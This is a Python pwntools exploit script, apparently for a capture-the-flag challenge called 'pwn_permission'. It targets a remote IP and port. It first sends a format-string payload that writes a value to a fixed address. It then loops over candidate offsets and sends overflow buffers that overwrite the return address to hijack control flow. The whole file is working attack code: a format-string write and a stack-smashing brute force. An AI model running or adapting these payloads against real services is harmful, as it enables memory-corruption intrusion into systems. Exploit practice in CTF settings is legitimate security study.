from pwn import *

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# Use cyclic pattern to find exact offset
target_val_addr = 0x804c030

# Connect
conn = remote('39.96.193.120', 10000)

# Receive initial message
conn.recv(timeout=5)

# Stage 1: Format string to set target_val = 5
fmt_payload = p32(target_val_addr) + b'%1c%4$n'
conn.send(fmt_payload)

import time
time.sleep(1)
response = conn.recv(timeout=5)
log.info(f"After fmt payload: {response}")

# Stage 2: Send cyclic pattern to find offset
# The buffer is at ebp-0x90, so we need at least 0x90+4+4 = 152 bytes
# But read allows 0x100 = 256 bytes
pattern = cyclic(200)
conn.send(pattern)

time.sleep(2)

# The program should crash, and we can check the crash
# But since this is remote, we can't see the crash directly
# Let me try different offsets manually

conn.close()

# Try different offsets
for offset in range(140, 160):
    try:
        conn = remote('39.96.193.120', 10000)
        conn.recv(timeout=5)
        
        # Format string
        conn.send(p32(target_val_addr) + b'%1c%4$n')
        time.sleep(1)
        conn.recv(timeout=5)
        
        # ROP with this offset - return to vuln
        vuln_addr = elf.symbols['vuln']
        payload = b'A' * offset + p32(vuln_addr)
        conn.send(payload)
        
        time.sleep(1)
        
        # Check if we get "Input:\n"
        try:
            response = conn.recv(timeout=3)
            if b'Input:' in response:
                log.success(f"Offset {offset} works! Got Input: prompt")
                break
            else:
                log.info(f"Offset {offset}: Got response but no Input: - {response[:50]}")
        except EOFError:
            log.info(f"Offset {offset}: Crashed")
        
        conn.close()
    except Exception as e:
        log.info(f"Offset {offset}: Error - {type(e).__name__}")
        continue